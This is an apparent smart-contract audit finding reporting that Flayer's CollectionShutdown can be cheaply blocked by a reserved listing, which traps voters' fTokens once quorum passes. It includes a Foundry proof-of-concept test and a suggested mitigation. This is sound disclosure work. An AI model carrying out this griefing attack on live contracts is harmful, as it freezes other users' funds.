# CollectionShutdown can be cheaply DOS'd once a quorum has been reached, trapping voters' fTokens in the contract

### Summary

The safety checks in execute() in CollectionShutdown allow a malicious actor to DOS the function for very little capital via creating a protected listing. If quorum has passed, this can entirely lock voter's fTokens in CollectionShutdown until the DOS passes.

### Root Cause

In the execute() function in CollectionShutdown.sol, there is a [line that ensures there are no active listings.](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/utils/CollectionShutdown.sol#L241) This makes sense with legitimate listings because it will prevent a user selling a grail from getting rugged by a shutdown, but in the case of a reserved listing, it allows someone with little capital to keep the collection stuck.

```solidity
    function execute(address _collection, uint[] calldata _tokenIds) public onlyOwner whenNotPaused {
        // Check that no listings currently exist
@>      if (_hasListings(_collection)) revert ListingsExist();
```

Additionally, users who cast their votes are not allowed to withdraw their tokens if a quorum has been reached.

```solidity
    function reclaimVote(address _collection) public whenNotPaused {
        // If the quorum has passed, then we can no longer reclaim as we are pending
        // an execution.
        CollectionShutdownParams storage params = _collectionParams[_collection];
@>      if (params.canExecute) revert ShutdownQuorumHasPassed();
```

### Internal pre-conditions

1. The protocol must have 4 or less NFTs in custody
2. Users must have started a vote and reached a quorum to shut down the collection

### External pre-conditions

_No response_

### Attack Path

1. The griefer creates a reserved listing with a small amount of capital
2. Users fTokens are stuck in the CollectionShutdown contract until the DOS passes

### Impact

Users who voted to liquidate an entire collection will have their fTokens stuck inside the contract for as long as the attacker is able to pay the small fee required to DOS the shutdown. It only costs 0.05 fTokens of initial capital to start, plus 0.01 fTokens of fees to DOS the collection for 2 weeks. This would freeze at least 2 fTokens (half the supply!) at an ongoing rate of ~0.005 fTokens per week.

This could be worked around by depositing a fifth NFT, cancelling the vote, and users reclaiming their votes, but that is a lot of capital and hassle compared to what the attacker has to do to throw a wrench in the works.

### PoC

The following code is just to demonstrate how long a small amount of capital hold up the contract.

Please copy and paste the following into ProtectedListings.t.sol:
```solidity
function test_DosShutdown() public {
        // Set the owner to one of our test users (Alice)
        address payable _owner = users[0];

        // Mint our token to the _owner
        erc721a.mint(_owner, 1);
        vm.startPrank(_owner);

        // put an NFT in the locker
        uint[] memory ids = new uint[](1);
        ids[0] = 1;
        erc721a.approve(address(locker), 1);
        locker.deposit(address(erc721a), ids);

        address payable doser = users[1];

        // deal the DOSer a small amount of fTokens and start the DOS
        vm.startPrank(doser);
        deal(address(locker.collectionToken(address(erc721a))), doser, 0.06 ether);
        locker.collectionToken(address(erc721a)).approve(address(listings), 0.06 ether);
        listings.reserve(address(erc721a), 1, 0.06 ether);
        
        // let's see how long that relatively small amount of capital bricks the system
        // as long as the listing exists, it is impossible to call CollectionShutdown::execute()
        uint256 daysShutdown = 0;
        while (protectedListings.getProtectedListingHealth(address(erc721a), 1) > 0) {
            daysShutdown += 1;
            vm.warp(block.timestamp + (60 * 60 * 24));
        }

        // a 0.06 fToken investment (0.01 over the minimum) can DOS the shutdown function for 15 days
        assertEq(daysShutdown, 15);
    }
```

### Mitigation

Consider disallowing new Protected Listings when a quorum has been reached, and consider allowing users to reclaim votes more easily.
